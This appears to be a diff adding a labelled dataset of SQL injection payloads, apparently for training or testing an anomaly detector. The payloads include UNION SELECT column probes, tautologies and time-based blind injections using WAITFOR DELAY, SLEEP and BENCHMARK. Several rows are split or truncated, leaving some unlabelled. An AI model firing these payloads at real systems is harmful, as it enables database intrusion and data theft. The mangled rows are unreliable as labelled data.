+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",sqli,anom
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'#,sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",sqli,anom
+ ',sqli,anom
+'',sqli,anom
+`,sqli,anom
+``,sqli,anom
+",",sqli,anom
+"
+""
+/
+//
+\
+\\
+;
+' or ",sqli,anom
+-- or # ,sqli,anom
+' OR '1,sqli,anom
+' OR 1 -- -,sqli,anom
+" OR "" = ",sqli,anom
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+%00
+/*…*/ 
++	
+||	
+%	
+@variable	local variable
+@@variable	global variable
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1 AND (SELECT * FROM Users) = 1	
+' AND MID(VERSION(),1,1) = '5';
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+#	
+/*  
+-- -	
+;%00
+`SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),?SLEEP(1)))OR""*/ FROM some_table WHERE ex = ample",sqli,anom
+)%20waitfor%20delay%20'0:0:20'%20/*,sqli,anom
+)%20waitfor%20delay%20'0:0:20'%20--,sqli,anom
+')%20waitfor%20delay%20'0:0:20'%20/*,sqli,anom
+')%20waitfor%20delay%20'0:0:20'%20--,sqli,anom
+")%20waitfor%20delay%20'0:0:20'%20/*
+)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+))%20waitfor%20delay%20'0:0:20'%20/*,sqli,anom
+))%20waitfor%20delay%20'0:0:20'%20--,sqli,anom
+'))%20waitfor%20delay%20'0:0:20'%20/*,sqli,anom
+'))%20waitfor%20delay%20'0:0:20'%20--,sqli,anom
+"))%20waitfor%20delay%20'0:0:20'%20/*
+))%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+",NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"',NULL)%20waifor%20delay%20'0:0:20'%20/*",sqli,anom
+"',NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"),NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"'),NULL)%20waifor%20delay%20'0:0:20'%20/*",sqli,anom
+"'),NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli,anom
+"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli,anom
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sqli,anom
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",sqli,anom
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",sqli,anom
+"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sqli,anom
+"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",sqli,anom
+"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",sqli,anom
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",sqli,anom
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sqli,anom
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"' and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"' and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"' and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+") and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"')) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"')) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"')) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+")) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+")) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"')))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"')))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"')))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+")))) and 0=benchmark(3000000,MD5(1))%20%23
+waitfor delay '0:0:20' /* 
+ waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /* 
+' waitfor delay '0:0:20' --
+ waitfor delay '0:0:20' /* ",sqli,anom
+" waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* 
+) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* 
+)) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /* 
+') waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* ",sqli,anom
+") waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /* 
+')) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* ",sqli,anom
+")) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /* 
+'))) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* ",sqli,anom
+"))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /* 
+')))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* ",sqli,anom
+")))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /* 
+'))))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' /* ",sqli,anom
+"))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /* 
+')))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' /* ",sqli,anom
+")))))) waitfor delay '0:0:20' --
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* ",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* ",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",sqli,anom
